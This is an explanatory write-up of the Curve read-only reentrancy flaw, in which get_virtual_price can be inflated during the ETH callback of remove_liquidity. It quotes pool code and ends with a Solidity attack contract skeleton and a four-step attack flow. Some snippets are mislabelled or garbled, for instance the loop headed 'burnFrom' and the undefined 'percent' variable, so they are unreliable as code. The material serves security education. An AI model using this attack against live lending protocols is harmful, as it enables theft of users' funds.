**[Market Attack](https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/)**

The root cause is the inconsitency during updating balances.

While it requires some preparation, the attack vector starts in the remove_liquidity function of Curve stable swap pools (we will illustrate that with code of the ETH/stETH pool). Note that the Curve pool protects itself from reentrancy by using the Vyper-native reentrancy guards which were placed on every state-altering function.

```
@external
@nonreentrant('lock')
def remove_liquidity()
...
amounts: uint256[N_COINS] = self._balances()
lp_token: address = self.lp_token
total_supply: uint256 = ERC20(lp_token).totalSupply()
...
```
where the balances are the current balances held with some admin fees deducted.
```
@view
@internal
def _balances(_value: uint256 = 0) -> uint256[N_COINS]:
    return [
        self.balance - self.admin_balances[0] - _value,
        ERC20(self.coins[1]).balanceOf(self) - self.admin_balances[1]
    ]
 ```
 Next, the tokens are burned and hence the supply is decreased.
 
 `CurveToken(lp_token).burnFrom(msg.sender, _amount)`
 
 The LP token contract’s burnFrom function is a standard burning function that decreases the balance of the user and the total supply according to the amount of LP tokens burned by the user. Last, the underlying tokens are returned to the user.
 
 ```
 def burnFrom(msg.sender, _amount): 
   for i in range(N_COINS):
          value: uint256 = amounts[i] * _amount / total_supply
          assert value >= _min_amounts[i], "Withdrawal resulted in fewer coins than expected"amounts[i] = value
          if i == 0:
              raw_call(msg.sender, b"", value=value)
          else:
              assert ERC20(self.coins[1]).transfer(msg.sender, value)log RemoveLiquidity(msg.sender, amounts, empty(uint256[N_COINS]), total_supply - _amount)return amounts 

```
Per underlying, the share of the burned LP tokens is computed, checked against slippage, and sent out. At this point, the function interacts with non-Curve contracts which creates the danger of losing control of the execution. If an underlying token is ETH, native ETH is sent out which, if the recipient is a contract, triggers the recipient’s fallback function.

`raw_call(msg.sender, b"", value=value)`

During the execution of the fallback, not all tokens have been sent (balances not fully updated) while the total supply of the LP token has already decreased. Hence, an attacker can take control of the execution flow while the pool’s state is inconsistent. Pool balances and total supply do not match. Note that the function remove_liquidity_imbalance is similar to remove_liquidity but allows users to withdraw liquidity in an imbalanced way. Hence, if an imbalanced withdrawal taking just 1 wei of ETH is made, the balance will be significantly higher than with the regular remove_liquidity. Hence, the inconistency can be amplified.

That is when and why get_virtual_price becomes vulnerable.

```
@view
@external
def get_virtual_price() -> uint256:
    """
    @notice The current virtual price of the pool LP token
    @dev Useful for calculating profits
    @return LP token virtual price normalized to 1e18
    """
    D: uint256 = self.get_D(self._balances(), self._A())
    # D is in the units similar to DAI (e.g. converted to precision 1e18)
    # When balanced, D = n * x_u - total virtual value of the portfolio
    token_supply: uint256 = ERC20(self.lp_token).totalSupply()
    return D * PRECISION / token_supply
  ```
  Protocols integrating with get_virtual_price were trusting the return value blindly. Typically, its return value was used to estimate a lower bound for the LP’s value by multiplying it with the lowest exchange rate of the underlying tokens.
  ```
  // sample code
uint256 lowestPrice = type(uint256).max;
for (uint256 i = 0; i < N_COINS; i++) {
    price = oracle.price(pool.coins(i));
    lowestPrice = price < lowestPrice ? price : lowestPrice;
}
value = lowestPrice * pool.get_virtual_price() / 10**18;
```
Attack flow: 
1. Deposit large amounts of liquidity.
2. Remove liquidity.
3. During the callback perform malicious actions.
4. Profit.

This process can be implemented as a smart contract as below. Note that the snippet implements the weaker but simpler version using remove_liqudity instead of remove_liquidity_imbalance. For some projects, however, some optimization can be performed.

```
// pool is assumed to be an ETH pool with just one other token (e.g. stETH pool)
function exec(uint amountToken, uint percentRedeem) public payable {
    // prepare token
    token.transferFrom(msg.sender, address(this), amountToken);
    token.approve(address(pool), amountToken);    // add liquidity
    uint[2] memory amounts = [msg.value, amountToken];
    uint lps = pool.add_liquidity{value : msg.value}(amounts, 0);
    uint lps_redeem = lps * percent / 100;    // remove liqudity
    uint[2] memory zeros = [uint(0), 0];
    pool.remove_liquidity(lps_redeem, zeros);    // virtual price dropped
}fallback() external payable {
    // price of LP is pumped right now
    // malicious actions, use the remaining balance of lps if needed ...
}
```
We do not provide deploy link, because the vulnerable source code is inn vyper, not solidity 
